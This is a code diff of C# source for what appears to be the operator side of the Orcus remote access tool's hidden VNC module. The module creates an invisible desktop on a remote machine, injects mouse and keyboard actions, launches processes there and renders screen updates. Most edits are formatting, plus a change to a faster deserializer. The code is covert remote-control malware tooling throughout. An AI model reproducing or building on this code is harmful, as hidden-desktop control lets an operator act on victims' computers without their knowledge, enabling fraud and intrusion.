@@ -25,20 +25,22 @@ namespace Orcus.Administration.Commands.HVNC
 
         public override void ResponseReceived(byte[] parameter)
         {
-            switch ((HvncCommunication) parameter[0])
+            switch ((HvncCommunication)parameter[0])
             {
                 case HvncCommunication.ResponseDesktopCreated:
                     IsOpen = true;
                     IsOpenChanged?.Invoke(this, EventArgs.Empty);
-
                     RenderEngine = new RenderEngine(BitConverter.ToInt32(parameter, 1),
                         BitConverter.ToInt32(parameter, 5), RequestInformationDelegate);
                     RenderEngineUpdated?.Invoke(this, EventArgs.Empty);
-
                     LogService.Receive("Desktop created");
                     break;
                 case HvncCommunication.ResponseUpdate:
-                    RenderEngine.Update(new Serializer(typeof (WindowUpdate)).Deserialize<WindowUpdate>(parameter, 1));
+                    WindowUpdate WU = Serializer.FastDeserialize<WindowUpdate>(parameter, 1);
+                    //WindowUpdate WU = new Serializer(typeof(WindowUpdate)).Deserialize<WindowUpdate>(parameter, 1);
+                    RenderEngine.Update(WU);
+                    //RenderEngine.Update(WU, parameter,);
+                    //RenderEngineUpdated?.Invoke(this, EventArgs.Empty);
                     break;
                 case HvncCommunication.ResponseUpdateFailed:
                     RenderEngine?.UpdateFailed();
@@ -69,14 +71,14 @@ namespace Orcus.Administration.Commands.HVNC
                 throw new InvalidOperationException();
 
             var createDesktopInformationData =
-                new Serializer(typeof (CreateDesktopInformation)).Serialize(new CreateDesktopInformation
+                new Serializer(typeof(CreateDesktopInformation)).Serialize(new CreateDesktopInformation
                 {
                     CustomName = desktopName,
                     StartExplorer = startExplorer
                 });
 
             var data = new byte[createDesktopInformationData.Length + 1];
-            data[0] = (byte) HvncCommunication.CreateDesktop;
+            data[0] = (byte)HvncCommunication.CreateDesktop;
             Array.Copy(createDesktopInformationData, 0, data, 1, createDesktopInformationData.Length);
 
             ConnectionInfo.SendCommand(this, data);
@@ -85,14 +87,14 @@ namespace Orcus.Administration.Commands.HVNC
 
         public void CloseDesktop()
         {
-            ConnectionInfo.SendCommand(this, new[] {(byte) HvncCommunication.CloseDesktop});
+            ConnectionInfo.SendCommand(this, new[] { (byte)HvncCommunication.CloseDesktop });
             LogService.Send("Close desktop");
             RenderEngine.Dispose();
         }
 
         public void MouseAction(HvncAction action, int x, int y)
         {
-            var package = new List<byte> {(byte) HvncCommunication.DoAction, (byte) action};
+            var package = new List<byte> { (byte)HvncCommunication.DoAction, (byte)action };
             package.AddRange(BitConverter.GetBytes(x));
             package.AddRange(BitConverter.GetBytes(y));
             ConnectionInfo.SendCommand(this, package.ToArray());
@@ -101,7 +103,7 @@ namespace Orcus.Administration.Commands.HVNC
         public void MouseAction(HvncAction action)
         {
             ConnectionInfo.SendCommand(this,
-                new[] {(byte) HvncCommunication.DoAction, (byte) action});
+                new[] { (byte)HvncCommunication.DoAction, (byte)action });
         }
 
         public void KeyboardAction(byte keyCode, bool isPressed)
@@ -118,7 +120,7 @@ namespace Orcus.Administration.Commands.HVNC
         {
             var processNameData = Encoding.UTF8.GetBytes(processName);
             var data = new byte[processNameData.Length + 1];
-            data[0] = (byte) HvncCommunication.ExecuteProcess;
+            data[0] = (byte)HvncCommunication.ExecuteProcess;
             Array.Copy(processNameData, 0, data, 1, processNameData.Length);
             ConnectionInfo.SendCommand(this, data);
             LogService.Send("Execute process");
@@ -128,7 +130,7 @@ namespace Orcus.Administration.Commands.HVNC
         {
             //TODO: Int was changed to int64 -> error
             var updateData = new byte[5];
-            updateData[0] = (byte) HvncCommunication.GetUpdate;
+            updateData[0] = (byte)HvncCommunication.GetUpdate;
             Array.Copy(BitConverter.GetBytes(windowToRender), 0, updateData, 1, 4);
             ConnectionInfo.SendCommand(this, updateData);
         }
